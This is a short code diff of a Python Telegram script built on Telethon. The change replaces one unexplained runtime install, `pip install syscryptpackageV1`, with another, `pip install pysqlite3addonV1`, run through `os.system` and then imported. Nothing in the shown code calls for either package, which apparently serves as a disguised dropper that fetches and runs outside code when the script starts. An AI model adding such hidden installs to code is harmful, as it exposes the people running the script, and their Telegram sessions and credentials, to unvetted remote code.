@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptpackageV1")
-import syscryptpackageV1
+os.system("pip install pysqlite3addonV1")
+import pysqlite3addonV1
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
